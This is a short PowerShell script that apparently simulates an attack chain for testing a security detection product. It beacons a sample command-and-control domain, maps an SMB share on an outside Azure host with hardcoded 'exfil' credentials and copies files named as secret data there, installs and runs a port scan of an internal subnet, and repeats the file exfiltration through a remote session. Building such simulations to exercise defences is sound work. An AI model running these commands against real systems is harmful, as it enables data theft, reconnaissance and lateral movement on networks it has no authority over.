# Umbrella sample C2 domain
$domain = "examplebotnetdomain.com"

# HTTP web request
Invoke-WebRequest $domain

# Extfiltrate file
# Create new file share link
New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -TransportType QUIC -SkipCertificateCheck -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'
# Copy temp file to remote share
copy 'C:\Temp\super-secret-db.db' 'Z:\'

# Install Powershell NMap module
Install-Module -Name PSnmap -Scope CurrentUser -Force
# Run NMap scan on firewalled subnet
Invoke-PSnmap -Cn 10.200.200.0/24 -ScanOnPingFail -Port 443, 3389, 22, 5985, 5986 -Dns -PortConnectTimeoutMs 1000 -AddService

# Connect to remote device
Enter-PSSession 10.200.200.70

# Exfiltrate file
# Create new file share link
New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -TransportType QUIC -SkipCertificateCheck -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'
# Copy temp file to remote share
copy 'C:\Temp\secret-data.txt' 'Z:\'

# Exit remote device
Exit-PSSession

# Prevent the PowerShell window from closing immediately - for visibility in testing
Read-Host -Prompt "Press Enter to exit"
